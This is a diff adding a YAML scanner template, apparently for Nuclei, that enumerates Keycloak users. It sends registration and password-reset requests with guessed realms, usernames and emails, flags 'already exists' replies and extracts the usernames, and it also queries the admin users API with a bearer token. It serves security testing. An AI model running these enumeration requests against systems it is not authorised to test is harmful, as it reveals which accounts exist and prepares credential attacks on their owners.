@@ -1,0 +1,110 @@
+# Keycloak User Enumeration
+# Attempts to enumerate users through various Keycloak endpoints
+
+id: keycloak-user-enumeration
+
+info:
+  name: Keycloak User Enumeration
+  author: H1/rfs85
+  severity: medium
+  description: Attempts to enumerate users via registration, password reset, and login endpoints
+  reference:
+    - https://www.keycloak.org/docs/latest/server_admin/index.html#_user-management
+  tags: keycloak,user,enumeration,information-disclosure
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/auth/realms/{{realm}}/login-actions/registration"
+      - "{{BaseURL}}/realms/{{realm}}/login-actions/registration"
+      - "{{BaseURL}}/auth/realms/{{realm}}/login-actions/reset-credentials"
+      - "{{BaseURL}}/realms/{{realm}}/login-actions/reset-credentials"
+
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+
+    body: |
+      username={{username}}&email={{email}}&firstName=test&lastName=user&password=Password123!
+
+    payloads:
+      realm:
+        - "master"
+        - "admin"
+        - "internal"
+        - "external"
+        - "default"
+      username:
+        - "admin"
+        - "administrator"
+        - "user"
+        - "test"
+        - "demo"
+        - "root"
+        - "keycloak"
+        - "service"
+      email:
+        - "admin@example.com"
+        - "test@example.com"
+        - "user@example.com"
+
+    attack: pitchfork
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Username already exists"
+          - "Email already exists" 
+          - "User already exists"
+          - "already taken"
+          - "User with email"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+          - 400
+          - 409
+        condition: or
+
+    extractors:
+      - type: regex
+        name: existing_users
+        part: body
+        regex:
+          - "Username ([^\\s]+) already exists"
+          - "User ([^\\s]+) already exists"
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/auth/admin/realms/{{realm}}/users"
+      - "{{BaseURL}}/admin/realms/{{realm}}/users"
+      - "{{BaseURL}}/auth/admin/realms/{{realm}}/users?search={{username}}"
+
+    headers:
+      Authorization: "Bearer {{token}}"
+
+    payloads:
+      realm:
+        - "master"
+        - "admin"
+      username:
+        - "admin"
+        - "user"
+        - "test"
+
+    attack: pitchfork
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "\"username\""
+          - "\"email\""
+          - "\"firstName\""
+        condition: and
+
+      - type: status
+        status:
+          - 200
